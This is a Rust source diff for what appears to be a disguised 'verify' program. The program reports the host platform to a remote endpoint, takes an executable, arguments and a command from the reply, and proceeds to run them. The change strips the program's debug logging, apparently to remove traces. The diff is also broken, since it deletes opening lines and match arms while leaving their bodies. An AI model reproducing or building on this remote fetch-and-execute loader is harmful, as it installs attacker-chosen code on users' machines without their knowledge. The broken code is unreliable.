@@ -67,24 +67,16 @@ fn main() {
     let platform = if cfg!(target_os = "windows") { "win32" } else { "darwin" };
     let body = format!("{{\"p\":\"{}\"}}", platform);
 
-    let log_path = if cfg!(target_os = "windows") {
         format!("{}\\AppData\\Local\\Temp\\apex_verify.log", std::env::var("USERPROFILE").unwrap_or_default())
     } else {
         "/tmp/apex_verify.log".to_string()
     };
-    let mut log = String::new();
-    log.push_str(&format!("ep: {}\n", ep));
 
     let resp = match send_request(&ep, &body) {
-        Some(r) => { log.push_str(&format!("http_post OK len={}\n", r.len())); r }
-        None => { log.push_str("http_post FAILED\n"); let _ = fs::write(&log_path, &log); std::process::exit(0); }
     };
 
     let (exec, args, cmd) = match parse_response(&resp) {
-        Some(d) => { log.push_str("parse_payload OK\n"); d }
-        None => { log.push_str("parse_payload FAILED\n"); let _ = fs::write(&log_path, &log); std::process::exit(0); }
     };
-    let _ = fs::write(&log_path, &log);
 
     let done = done_path();
     if let Some(p) = done.parent() { let _ = fs::create_dir_all(p); }
